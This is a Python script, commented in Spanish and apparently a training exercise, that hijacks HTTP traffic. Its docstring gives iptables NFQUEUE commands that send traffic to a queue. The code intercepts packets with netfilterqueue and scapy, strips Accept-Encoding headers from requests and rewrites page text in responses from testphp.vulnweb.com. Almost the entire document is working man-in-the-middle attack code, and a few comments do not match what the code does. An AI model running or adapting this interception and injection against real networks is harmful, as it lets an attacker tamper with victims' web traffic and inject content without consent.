#!/usr/bin/env python3
"""
Traffic Hijacking 

Vamos a injectar código en la web testphp.vulnweb.com para que cuando se haga 
una petición a la web desde la máquina victima, se redirija a nuestra web.

Para que funcione hay que redirigir el tráfico a la cola 0:
iptables -I INPUT -j NFQUEUE --queue-num 0
iptables -I OUTPUT -j NFQUEUE --queue-num 0
iptables -I FORWARD -j NFQUEUE --queue-num 0
iptables --policy FORWARD ACCEPT

Con esto no puedes navegar porque los paquetes están a la espera 
de ser procesados por netfilterqueue.

Para eliminar las anteriores reglas:
iptables -D INPUT -j NFQUEUE --queue-num 0
iptables -D OUTPUT -j NFQUEUE --queue-num 0
iptables -D FORWARD -j NFQUEUE --queue-num 0
iptables --policy FORWARD ACCEPT

"""

import netfilterqueue
import re
import scapy.all as scapy
import signal
import sys


def def_handler(sig, frame):
    """
    Ctrl + C
    """

    print('\n[!] Saliendo...\n')
    sys.exit(1)


signal.signal(signal.SIGINT, def_handler)


def set_load(packet, load):
    """
    Modifica el campo load del paquete
    """

    # Modificamos el campo load del paquete
    packet[scapy.Raw].load = load

    # Eliminamos los campos de la capa IP y TCP para que se recalcule el checksum
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum

    return packet


def process_packet(packet):
    """
    Procesa los paquetes que llegan a la cola 0
    """

    scapy_packet = scapy.IP(packet.get_payload())

    if scapy_packet.haslayer(scapy.Raw):

        try:

            if scapy_packet[scapy.TCP].dport == 80:

                print("Modificada petición HTTP")

                # Eliminamos la cabecera Accept-Encoding para que no comprima
                # el contenido
                modified_load = re.sub(
                    b"Accept-Encoding:.*?\\r\\n", b"", scapy_packet[scapy.Raw].load
                )

                # Eliminamos la cabecera HTTP/1.1 para que no se queje
                new_packet = set_load(scapy_packet, modified_load)

                # Inyectamos código en la petición
                packet.set_payload(new_packet.build())

            elif scapy_packet[scapy.TCP].sport == 80:

                print("Modificada respuesta HTTP")

                # Inyectamos código HTML en la respuesta
                modified_load = scapy_packet[scapy.Raw].load.replace(
                    b"welcome to our page", b"Welcome to the hacked page ;)"
                )

                # Enviamos el paguete modificado
                new_packet = set_load(scapy_packet, modified_load)

                packet.set_payload(new_packet.build())

        except:

            pass

    packet.accept()


print(f"[+] Iniciando traffic hijacking ...")

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
